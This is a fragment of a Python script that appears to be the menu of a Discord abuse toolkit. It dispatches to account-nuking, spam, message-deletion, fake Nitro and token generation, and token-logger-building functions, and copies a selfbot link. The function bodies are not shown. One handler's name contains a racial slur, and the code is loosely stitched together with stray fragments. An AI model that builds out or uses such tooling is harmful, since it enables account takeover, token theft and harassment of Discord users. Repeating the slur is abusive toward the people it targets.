 7. Nitro Generator{random.choice(cuh)}
 8. Token Generator {random.choice(cuh)}
 9. More Tools
 10. Token Management
  
  
  """)




  disc = input("Option: ")
  if disc == "1":
    accnukerz()
  if disc == "2":
    niggiz()
  if disc == "3":
    arskyz()
  if disc == "4":
    copy2clip("https://replit.com/@uvuboy446uvuboy/selfbot-V2?c=100")

  if disc == "5":
    spamz()
  if disc == "6":
    deletion()
  if disc == "7":
    nitrogen()
  if disc == "8":
    tokengen()
  if disc == "9":
    moretools()
  if disc == "10":
      wait

def discordload():
  words = "Getting Extensions ready"
  for char in words:
      sleep(0.038)
      sys.stdout.write(char)
      sys.stdout.flush()


accnuke = input("Option: ")
if accnuke == "1":
  discordvirgin()
if accnuke == "2":
  tokenmanagement()
if accnuke == "3":
  tokenlogmaker()



import time

def time_convert(sec):
  mins = sec // 60
  sec = sec % 60
  hours = mins // 60
  mins = mins % 60
  print("Time Lapsed = {0}:{1}:{2}".format(int(hours),int(mins),sec))


start_time = time.time()

